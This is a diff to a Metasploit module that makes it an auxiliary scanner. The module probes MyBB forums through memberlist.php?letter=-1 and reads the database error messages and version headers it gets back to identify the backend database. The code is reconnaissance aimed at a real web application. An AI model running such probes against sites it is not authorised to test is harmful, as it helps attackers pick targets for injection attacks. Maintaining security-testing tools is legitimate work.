@@ -1,6 +1,6 @@
 require 'msf/core'
 
-class Metasploit3 < Msf::Exploit::Remote
+class Metasploit3 < Msf::Auxiliary
   Rank = ExcellentRanking
 
   include Msf::Exploit::Remote::HttpClient
@@ -59,12 +59,12 @@ class Metasploit3 < Msf::Exploit::Remote
           }, 25)
     rescue
       print_error("Unable to connect to server.")
-      return CheckCode::Unknown
+      return Exploit::CheckCode::Unknown
     end
 
     if res.code != 200
       print_error("Unable to query to host")
-      return CheckCode::Unknown
+      return Exploit::CheckCode::Unknown
     end
 
     php_version = res['X-Powered-By']
@@ -72,7 +72,7 @@ class Metasploit3 < Msf::Exploit::Remote
       print_good("PHP Version: #{php_version}")
     else
       print_status("Unknown PHP Version")
-	  return CheckCode::Unknown
+	  return Exploit::CheckCode::Unknown
     end
 	
 	_Version_server = res['Server']
@@ -80,12 +80,12 @@ class Metasploit3 < Msf::Exploit::Remote
 	 print_good("Server Version: #{_Version_server}")
 	else
       print_status("Unknown Server Version")
-	  return CheckCode::Unknown
+	  return Exploit::CheckCode::Unknown
 	end
-	return CheckCode::Detected
+	return Exploit::CheckCode::Detected
   end
 
-  def exploit
+  def run
     uri = normalize_uri(target_uri.path, '/memberlist.php?letter=-1')
     response = send_request_raw(
           {
@@ -109,7 +109,7 @@ class Metasploit3 < Msf::Exploit::Remote
 	  print_good("Database is: PostgreSQL ;)")
 	elsif response.body.match(/General error\: 1 no such function\: REGEXP/)
 	  print_good("Database is: SQLite ;)")
-	else response.body.match(/Member List/)
+	else 
 	  print_status("Database MySQL or this is not forum MyBB or unknown Database")
     end	
 	
